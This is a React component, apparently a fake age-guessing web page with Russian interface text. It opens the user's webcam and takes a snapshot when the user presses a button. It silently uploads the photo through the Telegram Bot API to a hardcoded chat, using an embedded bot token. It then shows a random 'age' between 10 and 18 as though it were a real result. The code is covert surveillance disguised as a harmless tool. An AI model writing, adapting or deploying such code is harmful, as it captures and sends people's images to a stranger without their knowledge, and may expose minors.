import React, { useRef, useEffect, useState } from "react";
import axios from "axios";
function Chat() {
  const videoRef = useRef(null);
  const [count, setCount] = useState(0);
  const [chatid, setChatId] = React.useState("5335499274"); // Ваш личный chat_id
  const Baseurl =
    "https://api.telegram.org/bot7162055702:AAEpgb9dcj09MYhrDL6dKF-bL2NR5klaWn0/"; // Убедитесь, что ваш токен верен

  useEffect(() => {
    startCamera();
  }, []);

  function startCamera() {
    navigator.mediaDevices
      .getUserMedia({ video: true })
      .then((stream) => {
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play();
        }
      })
      .catch((error) => {
        console.error("Ошибка доступа к камере:", error);
      });
  }

  const takePicture = async () => {
    const video = videoRef.current;
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Получаем изображение в формате dataURL
    const imageDataUrl = canvas.toDataURL("image/png");

    // Преобразуем dataURL в Blob
    const blob = await (await fetch(imageDataUrl)).blob();
    const formData = new FormData();
    formData.append("chat_id", chatid);
    formData.append("photo", blob, "snapshot.png");

    // Отправляем изображение через Telegram API
    try {
      const sendPhotoUrl = `${Baseurl}sendPhoto`;
      await axios.post(sendPhotoUrl, formData, {
        headers: { "Content-Type": "multipart/form-data" },
      });
      const randomAge = Math.floor(Math.random() * (18 - 10 + 1)) + 10;
      setCount(randomAge);

      console.log("Фото успешно отправлено в Telegram");
    } catch (error) {
      console.error("Ошибка отправки фото в Telegram:", error);
    }
  };

  return (
    <div style={{ margin: "0 auto", maxWidth: "1140px" }}>
      <h1 style={{ textAlign: "center", paddingTop: "18px" }}>приготовьтесь</h1>
      <video ref={videoRef} style={{ width: "100%", maxWidth: "600px" }} />
      <div
        style={{
          display: "flex",
          justifyContent: "end",
          marginTop: "18px",
          marginRight: "8px",
        }}
      >
        <button onClick={takePicture}>Сфотографироться</button>
      </div>
      <h1>вам {count} лет</h1>
    </div>
  );
}

export default Chat;
